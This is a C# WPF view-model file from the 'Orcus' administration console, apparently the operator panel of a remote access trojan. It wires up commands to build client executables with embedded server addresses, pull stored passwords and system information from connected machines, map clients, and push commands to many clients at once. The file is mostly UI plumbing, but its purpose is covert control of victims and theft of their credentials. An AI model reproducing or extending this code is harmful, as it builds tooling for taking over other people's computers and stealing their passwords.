using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using MahApps.Metro.Controls;
using MahApps.Metro.Controls.Dialogs;
using Orcus.Administration.Core;
using Orcus.Administration.Core.ClientManagement;
using Orcus.Administration.Core.CLA;
using Orcus.Administration.Core.CommandManagement;
using Orcus.Administration.Core.CrowdControl;
using Orcus.Administration.Core.Logging;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.Core.Utilities;
using Orcus.Administration.ViewModels.Main;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Plugins.PropertyGrid.Attributes;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Connection;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.TransmissionEvents;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels
{
    public class MainViewModel : PropertyChangedBase
    {
        private readonly UpdateService _updateService;
        private ControllerViewModel _clientControllerViewModel;
        private ActivityMonitorViewModel _activityMonitorViewModel;
        private ConnectionManager _connectionManager;
        private bool _isClosing;
        private bool _isConsoleAtTop;
        private bool _isLoggedIn;
        private bool _isUpdateAvailable;
        private IWindow _activityMonitorWindow;
        private UiModifier _uiModifier;

        private RelayCommand _buildCommand;
        private RelayCommand _changeGroupCommand;
        private RelayCommand _changeGroupNewCommand;
        private RelayCommand _logInCommand;
        private RelayCommand _logoutCommand;
        private RelayCommand _openClientMapCommand;
        private RelayCommand _openCrowdControlCommand;
        private RelayCommand _openDataManagerCommand;
        private RelayCommand _openDataManagerOfClientsCommand;
        private RelayCommand _openExceptionsCommand;
        private RelayCommand _openPluginCommand;
        private RelayCommand _openPluginsCommand;
        private RelayCommand _openSettingsCommand;
        private RelayCommand _openStatisticsCommand;
        private RelayCommand _openUpdaterCommand;
        private RelayCommand _passwordsCommand;
        private RelayCommand _removeClientsCommand;
        private RelayCommand _getComputerInformationCommand;
        private RelayCommand _copyClientCommand;
        private RelayCommand _clientPluginClickedCommand;
        private RelayCommand _clientsCrowdControlCommand;
        private RelayCommand _openActivityMonitorCommand;
        private RelayCommand _executeStaticCommand;
        private RelayCommand _executeCommandPresetWithTargetCommand;
        private RelayCommand _executeCommandPresetCommand;

        public MainViewModel()
        {
            if (DesignerProperties.GetIsInDesignMode(new DependencyObject()))
                return;

            Log = Logger.Entries;
            Application.Current.MainWindow.Closing += MainWindow_Closing;

            Settings = Settings.Current;

            _updateService = new UpdateService();
            _updateService.UpdateFound += UpdateService_UpdateFound;
            _updateService.CheckForUpdates();

            IsConsoleAtTop = Settings.IsConsoleAtTop;
            Settings.ConsolePositionChanged += Settings_ConsolePositionChanged;

            LoadStaticCommandPlugins();
        }

        public UiModifier UiModifier
        {
            get { return _uiModifier; }
            set { SetProperty(value, ref _uiModifier); }
        }

        public ObservableCollection<LogEntry> Log { get; }
        public Settings Settings { get; set; }

        public ActivityMonitorViewModel ActivityMonitorViewModel
        {
            get { return _activityMonitorViewModel; }
            set { SetProperty(value, ref _activityMonitorViewModel); }
        }

        public bool IsUpdateAvailable
        {
            get { return _isUpdateAvailable; }
            set { SetProperty(value, ref _isUpdateAvailable); }
        }

        public ConnectionManager ConnectionManager
        {
            get { return _connectionManager; }
            set { SetProperty(value, ref _connectionManager); }
        }

        public ControllerViewModel ClientControllerViewModel
        {
            get { return _clientControllerViewModel; }
            set { SetProperty(value, ref _clientControllerViewModel); }
        }

        public bool IsLoggedIn
        {
            get { return _isLoggedIn; }
            set
            {
                if (SetProperty(value, ref _isLoggedIn) && !value)
                {
                    ConnectionManager.CloseCurrentController();
                    ClientControllerViewModel = null;
                }
            }
        }

        public bool IsConsoleAtTop
        {
            get { return _isConsoleAtTop; }
            set { SetProperty(value, ref _isConsoleAtTop); }
        }

        public List<StaticCommandGroup> OfflineStaticCommandGroups { get; set; }
        public List<StaticCommandGroup> StaticCommandGroups { get; set; }
        public CollectionViewSource CommandPresetsWithTarget { get; set; }
        public CollectionViewSource CommandPresets { get; set; }

        public RelayCommand LogInCommand
        {
            get
            {
                return _logInCommand ?? (_logInCommand = new RelayCommand(parameter =>
                {
                    var client = parameter as ClientViewModel;
                    if (client == null)
                        return;

                    var onlineClient =
                        ConnectionManager.ClientProvider.GetClientInformation(client) as OnlineClientInformation;
                    if (onlineClient != null)
                        ConnectionManager.LogInClient(onlineClient);
                }));
            }
        }

        public RelayCommand BuildCommand
        {
            get
            {
                return _buildCommand ?? (_buildCommand = new RelayCommand(parameter =>
                {
                    WindowServiceInterface.Current.OpenWindowDialog(
                        new ClientBuilderViewModel(ConnectionManager.IpAddresses));
                }));
            }
        }

        public RelayCommand OpenSettingsCommand
        {
            get
            {
                return _openSettingsCommand ?? (_openSettingsCommand = new RelayCommand(parameter =>
                {
                    WindowServiceInterface.Current.OpenWindowDialog(new SettingsViewModel(Settings, ConnectionManager));
                }));
            }
        }

        public RelayCommand ChangeGroupCommand
        {
            get
            {
                return _changeGroupCommand ?? (_changeGroupCommand = new RelayCommand(parameter =>
                {
                    var values = (object[]) parameter;
                    var name = (string) values[0];
                    var clients = (IList) values[1];

                    ConnectionManager.ChangeGroup(clients.Cast<ClientViewModel>().Select(x => x.Id).ToList(), name);
                }));
            }
        }

        public RelayCommand ChangeGroupNewCommand
        {
            get
            {
                return _changeGroupNewCommand ?? (_changeGroupNewCommand = new RelayCommand(async parameter =>
                {
                    var clients = (IList) parameter;
                    if (clients == null)
                        return;

                    var input =
                        await
                            ((MetroWindow) Application.Current.MainWindow).ShowInputAsync(
                                (string) Application.Current.Resources["Move"],
                                (string) Application.Current.Resources["InsertNewGroupName"]);

                    if (input == null)
                        return;

                    await
                        Task.Run(
                            () =>
                                ConnectionManager.ChangeGroup(clients.Cast<ClientViewModel>().Select(x => x.Id).ToList(),
                                    input));
                }));
            }
        }

        public RelayCommand RemoveClientsCommand
        {
            get
            {
                return _removeClientsCommand ?? (_removeClientsCommand = new RelayCommand(async parameter =>
                {
                    var clients = (IList) parameter;
                    if (clients == null)
                        return;

                    var clientList = clients.Cast<ClientViewModel>().Where(x => !x.IsOnline).ToList();
                    if (clientList.Count == 0)
                        return;

                    if (
                        await
                            ((MetroWindow) Application.Current.MainWindow).ShowMessageAsync(
                                (string) Application.Current.Resources["Remove"],
                                clientList.Count == 1
                                    ? (string) Application.Current.Resources["SureRemoveClient"]
                                    : string.Format((string) Application.Current.Resources["SureRemoveClients"],
                                        clientList.Count), MessageDialogStyle.AffirmativeAndNegative) !=
                        MessageDialogResult.Affirmative)
                        return;

                    //this task is really important, it must not run on the UI thread
                    await Task.Run(() => ConnectionManager.RemoveStoredData(clientList));
                }));
            }
        }

        public RelayCommand GetComputerInformationCommand
        {
            get
            {
                return _getComputerInformationCommand ??
                       (_getComputerInformationCommand =
                           new RelayCommand(
                               async parameter =>
                               {
                                   var client =
                                       ConnectionManager.ClientProvider.GetClientInformation((ClientViewModel) parameter);

                                   var information =
                                       await
                                           Task.Run(
                                               () =>
                                                   ConnectionManager.GetComputerInformation(client));

                                   if (information != null)
                                       WindowServiceInterface.Current.OpenWindowCentered(
                                           new ComputerInformationViewModel(information),
                                           $"{(string) Application.Current.Resources["ComputerInformation"]} ({client.UserName})");
                               }));
            }
        }

        public RelayCommand GetPasswordsCommand
        {
            get
            {
                return _passwordsCommand ??
                       (_passwordsCommand =
                           new RelayCommand(
                               async parameter =>
                               {
                                   var client =
                                       ConnectionManager.ClientProvider.GetClientInformation((ClientViewModel) parameter);

                                   var passwords =
                                       await
                                           Task.Run(() => ConnectionManager.GetPasswords(client));
                                   if (passwords != null)
                                       WindowServiceInterface.Current.OpenWindowCentered(
                                           new PasswordsViewModel(passwords),
                                           $"{(string) Application.Current.Resources["Passwords"]} ({client.UserName})");
                               }));
            }
        }

        public RelayCommand ClientsCrowdControlCommand
        {
            get
            {
                return _clientsCrowdControlCommand ?? (_clientsCrowdControlCommand = new RelayCommand(parameter =>
                {
                    var clients = parameter as IList;
                    if (clients == null)
                        return;

                    var clientList = clients.OfType<ClientViewModel>();
                    WindowServiceInterface.Current.OpenWindowDialog(
                        new CrowdControlCreateTaskViewModel(ConnectionManager, clientList,
                            (string) Application.Current.Resources["CreateTask"]));
                }));
            }
        }

        public RelayCommand ExecuteStaticCommand
        {
            get
            {
                return _executeStaticCommand ?? (_executeStaticCommand = new RelayCommand(parameter =>
                {
                    var parameters = (object[]) parameter;
                    var staticCommandType = (Type) parameters[0];
                    var clients = parameters[1] as IList;

                    if (clients == null || staticCommandType == null)
                        return;

                    var staticCommand = (StaticCommand) Activator.CreateInstance(staticCommandType);
                    if (staticCommand.Properties.Count > 0)
                    {
                        var crowdControlShortcutSettingsViewModel =
                            new CrowdControlShortcutSettingsViewModel(staticCommand);

                        if (
                            WindowServiceInterface.Current.OpenWindowDialog(crowdControlShortcutSettingsViewModel,
                                $"{staticCommand.Name} - {Application.Current.Resources["Settings"]}") != true)
                            return;
                    }

                    var isCommandOnline = staticCommandType.GetCustomAttribute<OfflineAvailableAttribute>() == null;
                    ConnectionManager.StaticCommander.ExecuteCommand(staticCommand,
                        new ImmediatelyTransmissionEvent(), null, StopEvent.Default, null,
                        CommandTarget.FromClients(
                            clients.OfType<ClientViewModel>().Where(x => x.IsOnline == isCommandOnline).Select(x => x.Id).ToList()))
                        .Forget();
                }));
            }
        }

        public RelayCommand ExecuteCommandPresetWithTargetCommand
        {
            get
            {
                return _executeCommandPresetWithTargetCommand ?? (_executeCommandPresetWithTargetCommand = new RelayCommand(parameter =>
                {
                    var shortcutInfo = parameter as PresetInfo;
                    if (shortcutInfo == null)
                        return;

                    _connectionManager.StaticCommander.ExecutePreset((CommandPresetWithTarget) shortcutInfo.Preset);
                }));
            }
        }

        public RelayCommand ExecuteCommandPresetCommand
        {
            get
            {
                return _executeCommandPresetCommand ?? (_executeCommandPresetCommand = new RelayCommand(parameter =>
                {
                    var parameters = (object[]) parameter;
                    var shortcutInfo = (PresetInfo) parameters[0];
                    var clients = parameters[1] as IList;

                    if (shortcutInfo == null || clients == null)
                        return;

                    _connectionManager.StaticCommander.ExecutePreset(shortcutInfo.Preset,
                        CommandTarget.FromClients(clients.OfType<ClientViewModel>().Select(x => x.Id).ToList()));
                }));
            }
        }

        public RelayCommand OpenPluginsCommand
        {
            get
            {
                return _openPluginsCommand ?? (_openPluginsCommand = new RelayCommand(parameter =>
                {
                    var pluginsViewModel = new PluginsViewModel();
                    WindowServiceInterface.Current.OpenWindowDialog(pluginsViewModel);

                    if (pluginsViewModel.RefreshAdministration)
                        LoadAdministrationPlugins();
                }));
            }
        }

        public RelayCommand OpenExceptionsCommand
        {
            get
            {
                return _openExceptionsCommand ??
                       (_openExceptionsCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   WindowServiceInterface.Current.OpenWindowDialog(
                                       new ExceptionsViewModel(_connectionManager));
                               }));
            }
        }

        public RelayCommand OpenDataManagerCommand
        {
            get
            {
                return _openDataManagerCommand ?? (_openDataManagerCommand = new RelayCommand(parameter =>
                {
                    WindowServiceInterface.Current.OpenWindowDialog(new DataManagerViewModel(ConnectionManager,
                        UiModifier));
                }));
            }
        }

        public RelayCommand OpenClientMapCommand
        {
            get
            {
                return _openClientMapCommand ??
                       (_openClientMapCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   WindowServiceInterface.Current.OpenWindowDialog(new ClientMapViewModel(ConnectionManager));
                               }));
            }
        }

        public RelayCommand OpenStatisticsCommand
        {
            get
            {
                return _openStatisticsCommand ??
                       (_openStatisticsCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   WindowServiceInterface.Current.OpenWindowDialog(
                                       new StatisticsViewModel(ConnectionManager));
                               }));
            }
        }

        public RelayCommand OpenCrowdControlCommand
        {
            get
            {
                return _openCrowdControlCommand ??
                       (_openCrowdControlCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   WindowServiceInterface.Current.OpenWindowDialog(
                                       new CrowdControlViewModel(ConnectionManager));
                               }));
            }
        }

        public RelayCommand CopyClientCommand
        {
            get
            {
                return _copyClientCommand ?? (_copyClientCommand = new RelayCommand(async parameter =>
                {
                    var client = parameter as ClientViewModel;
                    if (client == null)
                        return;

                    var onlineClient =
                        ConnectionManager.ClientProvider.GetClientInformation(client) as OnlineClientInformation;
                    if (onlineClient == null)
                        return;

                    var clientConfig = await Task.Run(() => ConnectionManager.GetClientConfig(onlineClient));

                    WindowServiceInterface.Current.OpenWindowDialog(
                        new ClientBuilderViewModel(clientConfig, ConnectionManager.IpAddresses));
                }));
            }
        }

        public RelayCommand OpenUpdaterCommand
        {
            get
            {
                return _openUpdaterCommand ??
                       (_openUpdaterCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   WindowServiceInterface.Current.OpenWindowDialog(new UpdateViewModel(_updateService));
                               }));
            }
        }

        public RelayCommand OpenPluginCommand
        {
            get
            {
                return _openPluginCommand ??
                       (_openPluginCommand =
                           new RelayCommand(parameter => { UiModifier.MainMenuItemClicked((MenuItem) parameter); }));
            }
        }

        public RelayCommand ClientPluginClickedCommand
        {
            get
            {
                return _clientPluginClickedCommand ?? (_clientPluginClickedCommand = new RelayCommand(parameter =>
                {
                    var parameters = (object[]) parameter;
                    var clientViewModel = (ClientViewModel) parameters[0];
                    var menuItem = (MenuItem) parameters[1];

                    if (clientViewModel.IsOnline)
                    {
                        var client = ConnectionManager.ClientProvider.GetClientInformation(clientViewModel);
                        var onlineClient = client as OnlineClientInformation;
                        if (onlineClient == null)
                            return;
                        UiModifier.OnlineClientInformationMenuItemClicked(menuItem, onlineClient);
                    }
                    else
                    {
                        var client = ConnectionManager.ClientProvider.GetClientInformation(clientViewModel);
                        var offlineClient = client as OfflineClientInformation;
                        if (offlineClient == null)
                            return;
                        UiModifier.OfflineClientInformationMenuItemClicked(menuItem, offlineClient);
                    }
                }));
            }
        }

        public RelayCommand OpenDataManagerOfClientsCommand
        {
            get
            {
                return _openDataManagerOfClientsCommand ??
                       (_openDataManagerOfClientsCommand = new RelayCommand(parameter =>
                       {
                           var parameters = (object[]) parameter;

                           var clients = ((IList) parameters[0]).Cast<ClientViewModel>().ToList();
                           if (clients.Count == 0)
                               return;

                           var searchText = (string) parameters[1];
                           if (!string.IsNullOrEmpty(searchText))
                               searchText = "is:" + Application.Current.Resources[searchText];

                           WindowServiceInterface.Current.OpenWindowDialog(new DataManagerViewModel(ConnectionManager,
                               UiModifier)
                           {
                               SearchText = (string.IsNullOrEmpty(searchText) ? null : searchText + " ") +
                                            string.Join(" ", clients.Select(x => "CI-" + x.Id))
                           });
                       }));
            }
        }

        public RelayCommand LogoutCommand
        {
            get
            {
                return _logoutCommand ?? (_logoutCommand = new RelayCommand(parameter =>
                {
                    ConnectionManager.Dispose();
                }));
            }
        }

        public RelayCommand OpenActivityMonitorCommand
        {
            get
            {
                return _openActivityMonitorCommand ?? (_openActivityMonitorCommand = new RelayCommand(parameter =>
                {
                    if (_activityMonitorWindow != null)
                    {
                        if (_activityMonitorWindow.WindowState == WindowState.Minimized)
                            _activityMonitorWindow.WindowState = WindowState.Normal;

                        _activityMonitorWindow.Activate();
                        return;
                    }

                    ActivityMonitorViewModel.IsOpen = true;
                    _activityMonitorWindow = WindowServiceInterface.Current.OpenWindowCentered(
                        _activityMonitorViewModel,
                        "Orcus - " + (string) Application.Current.Resources["ActivityMonitor"]).Value;

                    _activityMonitorWindow.Closed += (sender, args) =>
                    {
                        _activityMonitorWindow = null;
                        ActivityMonitorViewModel.IsOpen = false;
                    };
                }));
            }
        }

        private void Settings_ConsolePositionChanged(object sender, EventArgs e)
        {
            IsConsoleAtTop = Settings.IsConsoleAtTop;
        }

        private void UpdateService_UpdateFound(object sender, EventArgs e)
        {
            IsUpdateAvailable = true;
        }

        private ConnectionManager GetCommandLineConnectionManager()
        {
            if (string.IsNullOrEmpty(CommandLineArgs.Current.ServerAddress) ||
                string.IsNullOrEmpty(CommandLineArgs.Current.Password) || !CommandLineArgs.Current.AutoConnect)
                return null;

            ConnectionManager connectionManager;
            ConnectionManager.ConnectToServer(CommandLineArgs.Current.ServerAddress, CommandLineArgs.Current.Port,
                CommandLineArgs.Current.Password, out connectionManager);

            return connectionManager;
        }

        public bool Loaded(bool firstStartup)
        {
            if (firstStartup)
                ConnectionManager = GetCommandLineConnectionManager();
            if (ConnectionManager == null)
            {
                var connectToServerViewModel =
                    new ConnectToServerViewModel(CommandLineArgs.Current.ServerAddress ?? Settings.LastServerIp,
                        CommandLineArgs.Current.Port == 0 ? Settings.LastServerPort : CommandLineArgs.Current.Port,
                        CommandLineArgs.Current.Password) {IsUpdateAvailable = IsUpdateAvailable};

                connectToServerViewModel.OpenUpdateWindow +=
                    (sender, args) =>
                        WindowServiceInterface.Current.OpenWindowDialog(new UpdateViewModel(_updateService));

                EventHandler eventHandler =
                    (sender, args) => connectToServerViewModel.IsUpdateAvailable = true;

                _updateService.UpdateFound += eventHandler;

                if (WindowServiceInterface.Current.OpenWindowDialog(connectToServerViewModel) == true)
                    ConnectionManager = connectToServerViewModel.ConnectionManager;

                _updateService.UpdateFound -= eventHandler;
            }

            if (ConnectionManager == null)
            {
                Application.Current?.Shutdown();
                return false;
            }

            Settings.LastServerIp = ConnectionManager.Ip;
            Settings.LastServerPort = ConnectionManager.Port;
            Settings.Save();
            ConnectionManager.LoginOpened += ConnectionManagerOnLoginOpened;
            ConnectionManager.Disconnected += ConnectionManagerOnDisconnected;

            LoadAdministrationPlugins();

            ActivityMonitorViewModel = new ActivityMonitorViewModel(ConnectionManager);
            return true;
        }

        private void LoadAdministrationPlugins()
        {
            var modifier = new UiModifier();
            var control = new AdministrationControl(ConnectionManager);
            foreach (var administrationPlugin in PluginManager.Current.LoadedPlugins.OfType<AdministrationPlugin>())
                administrationPlugin.Plugin.Initialize(modifier, control);
            foreach (var viewPlugin in PluginManager.Current.LoadedPlugins.OfType<ViewPlugin>())
                viewPlugin.Plugin.Initialize(modifier);
            foreach (var viewPlugin in PluginManager.Current.LoadedPlugins.OfType<CommandAndViewPlugin>())
                viewPlugin.Plugin.Initialize(modifier);

            UiModifier = modifier;
        }

        private void LoadStaticCommandPlugins()
        {
            var allStaticCommands =
                StaticCommander.GetStaticCommands().Select(x => new StaticCommandItem(x)).ToList();

            StaticCommandGroups = allStaticCommands.Where(x => !x.OfflineAvailable)
                .GroupBy(x => x.Category)
                .Select(x => new StaticCommandGroup {Name = x.Key, StaticCommands = x.ToList()})
                .ToList();

            OfflineStaticCommandGroups = allStaticCommands.Where(x => x.OfflineAvailable)
                .GroupBy(x => x.Category)
                .Select(x => new StaticCommandGroup {Name = x.Key, StaticCommands = x.ToList()})
                .ToList();

            CommandPresetsWithTarget = new CollectionViewSource {Source = CrowdControlPresets.Current.Presets};
            CommandPresetsWithTarget.Filter +=
                (sender, args) => args.Accepted = !((PresetInfo) args.Item).Preset.IsCommandPreset;

            //idk why, but if we just take the ICollectionView, the SourceCollection becomes null and it doesn't update
            CommandPresets = new CollectionViewSource {Source = CrowdControlPresets.Current.Presets};
            CommandPresets.Filter +=
                (sender, args) => args.Accepted = ((PresetInfo) args.Item).Preset.IsCommandPreset;
        }

        private void ConnectionManagerOnDisconnected(object sender, EventArgs e)
        {
            if (_isClosing || ApplicationInterface.ForceShutdown)
                return;

            //We close all open windows expect the main window and the settings window
            Application.Current.Dispatcher.Invoke(() =>
            {
                foreach (var window in Application.Current.Windows.OfType<MetroWindow>())
                {
                    if (window != Application.Current.MainWindow &&
                        window is GlowWindow == false &&
                        window.ToString() !=
                        "Microsoft.XamlDiagnostics.WpfTap.WpfVisualTreeService.Adorners.AdornerLayerWindow")
                        window.Close();
                }

                _isLoggedIn = false;
                OnPropertyChanged(nameof(IsLoggedIn));
            });

            ConnectionManager = null;
            Application.Current.Dispatcher.Invoke(new Action(() => Loaded(false)));
        }

        private void ConnectionManagerOnLoginOpened(object sender, EventArgs e)
        {
            ClientControllerViewModel = new ControllerViewModel(ConnectionManager.CurrentController);
            IsLoggedIn = true;
            Logger.Receive((string) Application.Current.Resources["ConnectionInitialized"]);
            ClientControllerViewModel.ClientController.Disconnected += (s, args) =>
            {
                ClientControllerViewModel.Dispose();
                ClientControllerViewModel = null;
                IsLoggedIn = false;
            };
        }

        private void MainWindow_Closing(object sender, CancelEventArgs e)
        {
            if (ClientControllerViewModel != null)
            {
                if (!ApplicationInterface.ForceShutdown && MessageBoxEx.Show(Application.Current.MainWindow,
                    (string) Application.Current.Resources["SureCloseSession"], "Orcus",
                    MessageBoxButton.OKCancel, MessageBoxImage.Warning) == MessageBoxResult.Cancel)
                {
                    e.Cancel = true;
                    return;
                }
                ClientControllerViewModel.Dispose();
            }
            _isClosing = true;
            ConnectionManager?.Dispose();
        }
    }
}